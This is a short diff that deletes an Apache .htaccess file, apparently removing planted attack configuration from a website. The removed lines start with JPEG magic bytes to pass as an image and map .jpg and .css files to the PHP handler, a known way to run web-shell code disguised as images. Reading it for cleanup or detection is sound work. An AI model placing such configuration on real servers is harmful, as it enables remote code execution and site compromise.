@@ -1,8 +1,0 @@
-#ÿØÿà
-Order allow,deny
-Allow from all
-Require all granted
-
-#ÿØÿà
-AddType application/x-httpd-php .jpg
-AddType application/x-httpd-php .css
